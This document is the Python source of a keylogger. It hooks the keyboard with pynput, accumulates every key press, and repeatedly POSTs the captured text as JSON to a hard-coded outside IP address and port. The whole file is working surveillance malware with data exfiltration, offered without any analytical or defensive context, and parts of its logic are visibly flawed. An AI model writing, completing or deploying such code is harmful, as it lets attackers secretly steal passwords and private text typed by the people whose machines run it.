import asyncio
import json
import logging

import aiohttp
from pynput import keyboard

# Constants for configuring IP address, port, and time interval
IP_ADDRESS = "109.74.200.23"
PORT_NUMBER = "8080"
TIME_INTERVAL = 10

# Initialize a global variable to capture text
text = ""

# Configure the logging mechanism to record application events
logging.basicConfig(filename='app.log', filemode='w',
                    format='%(name)s - %(levelname)s - %(message)s')

# Function that continuously sends POST requests with keyboard capture data
async def send_post_request(ip_address: str, port_number: str, text: str):
    try:
        payload = json.dumps({"keyboardData": text})
        async with aiohttp.ClientSession() as session:
            # Post the captured text as JSON payload to the server
            async with session.post(f"http://{ip_address}:{port_number}",
                                    data=payload, headers={"Content-Type": "application/json"}) as _:
                await asyncio.sleep(TIME_INTERVAL)  # Wait for the defined time interval
                # Recursively call the function to keep sending requests
                await send_post_request(ip_address, port_number, text)
    except Exception as e:
        logging.error(f"Couldn't complete request! Error: {e}")  # Log any exceptions

# Callback for capturing key press events
def on_press(key):
    global text  # Use the global text variable to accumulate key presses

    # Define behavior for special keys
    special_keys = {
        keyboard.Key.enter: "\n",        # New line for Enter key
        keyboard.Key.tab: "\t",          # Tab character for Tab key
        keyboard.Key.space: " ",         # Space for Space key
        keyboard.Key.shift: "",          # Ignore Shift keys
        keyboard.Key.backspace: "",      # Ignore Backspace (handled separately)
        keyboard.Key.ctrl_l: "",         # Ignore left Ctrl key
        keyboard.Key.ctrl_r: "",         # Ignore right Ctrl key
        keyboard.Key.esc: None           # Do not capture Escape key press
    }

    # Check if the pressed key is a special key
    if key in special_keys:
        # Special behavior for backspace: remove the last character typed
        if key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        else:
            # Add special key's value (like newline or tab) to text
            text += special_keys[key]
    else:
        # For letter keys, append the character to the text, stripping single quotes
        text += str(key).strip("'")
    return None

# Set up keyboard listener to capture key presses and start async tasks
with keyboard.Listener(on_press=on_press) as listener:
    # Start sending POST requests with the captured text
    asyncio.run(send_post_request(IP_ADDRESS, PORT_NUMBER, text))
    # Start capturing key presses
    listener.join()